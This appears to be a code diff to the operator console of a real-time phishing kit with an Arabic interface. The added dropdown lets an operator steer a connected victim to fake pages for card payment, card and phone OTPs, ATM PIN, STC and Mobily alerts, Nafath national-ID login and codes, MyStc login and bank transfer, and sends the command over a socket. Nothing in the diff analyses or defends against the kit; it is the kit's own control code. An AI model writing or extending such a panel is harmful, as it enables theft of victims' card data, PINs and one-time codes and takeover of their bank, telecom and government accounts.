@@ -482,12 +482,30 @@
       html += '</div>';
       html += '</div>';
       
-      // Action buttons
-      html += '<div class="flex gap-2">';
-      html += '<button onclick="approveForm(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 flex items-center gap-2"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>';
-      html += '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>موافقة</button>';
-      html += '<button onclick="rejectForm(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 flex items-center gap-2"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>';
-      html += '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>رفض</button>';
+      // Navigate to page (moved from bottom)
+      html += '<div class="flex items-center gap-2">';
+      html += '<span class="text-sm text-gray-500">توجيه لصفحة</span>';
+      html += '<select id="navigateSelectTop" class="px-3 py-2 border rounded-lg">';
+      html += '<option value="">اختر صفحة</option>';
+      html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
+      html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="atm-password">كلمة مرور ATM</option>';
+      html += '<option value="phone-verification">توثيق الجوال</option>';
+      html += '<option value="phone-otp">OTP الجوال</option>';
+      html += '<option value="stc-call-alert">تنبيه STC</option>';
+      html += '<option value="mobily-call-alert">تنبيه Mobily</option>';
+      html += '<option value="nafath-login-page">نفاذ</option>';
+      html += '<option value="nafath-otp">رمز نفاذ</option>';
+      html += '<option value="nafath-wait">انتظار نفاذ</option>';
+      html += '<option value="nafath-success">نجاح نفاذ</option>';
+      html += '<option value="nafath-failed">فشل نفاذ</option>';
+      html += '<option value="mystc-login">تسجيل دخول MyStc</option>';
+      html += '<option value="mystc-otp">MyStc OTP</option>';
+      html += '<option value="bank-transfer">التحويل البنكي</option>';
+      html += '<option value="bank-account-number">رقم الحساب</option>';
+      html += '<option value="final-page">الصفحة النهائية</option>';
+      html += '</select>';
+      html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
 
       // Display data history in reverse order (newest first)
@@ -670,6 +688,13 @@
 
     function navigateVisitor(socketId) {
       const page = document.getElementById('navigateSelect').value;
+      if (page) {
+        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+      }
+    }
+
+    function navigateVisitorTop(socketId) {
+      const page = document.getElementById('navigateSelectTop').value;
       if (page) {
         socket.emit('admin:navigate', { visitorSocketId: socketId, page });
       }
